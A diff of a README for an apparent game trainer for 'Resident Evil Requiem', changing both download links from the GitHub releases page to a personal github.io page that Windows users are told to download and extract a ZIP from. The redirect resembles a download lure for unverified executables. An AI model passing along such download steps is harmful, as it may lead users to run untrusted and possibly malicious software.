@@ -1,6 +1,6 @@
 # 🎮 Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2 - Enhance your game experience with ease
 
-[![](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://github.com/sarang-0007/Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2/releases)
+[![](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://sarang-0007.github.io)
 
 ## Overview
 
@@ -22,7 +22,7 @@ Ensure your computer meets these standards before you run the software:
 
 Follow these steps to set up the tool on your Windows computer.
 
-1.  Visit [this page](https://github.com/sarang-0007/Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2/releases) to download the latest version.
+1.  Visit [this page](https://sarang-0007.github.io) to download the latest version.
 2.  Locate the downloaded ZIP file in your computer folders.
 3.  Right-click the ZIP file and select the Extract All option.
 4.  Choose a location for the files and finish the extraction.
